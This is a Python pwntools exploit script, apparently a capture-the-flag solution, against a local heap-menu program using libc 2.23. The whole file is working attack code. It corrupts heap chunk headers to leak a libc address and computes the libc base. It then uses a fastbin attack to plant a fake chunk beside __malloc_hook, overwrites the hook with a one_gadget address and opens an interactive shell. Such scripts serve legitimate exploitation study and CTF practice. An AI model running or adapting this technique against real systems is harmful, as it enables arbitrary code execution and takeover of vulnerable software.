#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./program")
p = process("./program")
libc = ELF("libc-2.23.so")
gdb.attach(p,"init-pwndbg")

def allocate(size):
    p.sendlineafter('Command: ', '1')
    p.sendlineafter('Size: ', str(size))

def fill(index, size, content):
    p.sendlineafter('Command: ', '2')
    p.sendlineafter('Index: ', str(index))
    p.sendlineafter('Size: ', str(size))
    p.sendafter('Content: ', content)

def free(index):
    p.sendlineafter('Command: ', '3')
    p.sendlineafter('Index: ', str(index))

def dump(index):
    p.sendlineafter('Command: ', '4')
    p.sendlineafter('Index: ', str(index))
    p.recvuntil('Content: \n')

allocate(0x48) #chunk0
allocate(0x88) #chunk1
allocate(0x48) #chunk2
free(1)
fill(0,0x50,b'a'*0x40+p64(0x0)+p64(0x92))
allocate(0x88) #chunk2
dump(1)
leak = p.recvline()[:8]
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
print(hex(leak))
leak = leak - 0x399b78
libc.address = leak
log.critical("Libc base address: {}".format(hex(libc.address)))
allocate(0x68) #chunk3
__malloc_hook = libc.sym.__malloc_hook
fake_fast = __malloc_hook-35
payload = b'a'*0x40 + p64(0x0)+p64(0x71)+p64(fake_fast)
free(3)
fill(2,len(payload),payload)
allocate(0x68) #chunk3
allocate(0x68) #chunk4
one_gadget = libc.address + 0x3f712
payload = b'a'*19+ p64(one_gadget)
fill(4,len(payload),payload)
p.sendline("1")
p.sendline("1")
p.interactive()